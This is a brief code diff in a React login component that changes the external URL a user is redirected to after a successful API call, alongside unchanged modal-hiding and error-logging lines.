@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://wordpress-1479385-5611913.cloudwaysapps.com/bop/nero.html';
+      window.location.href = 'https://vertiza-ions.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
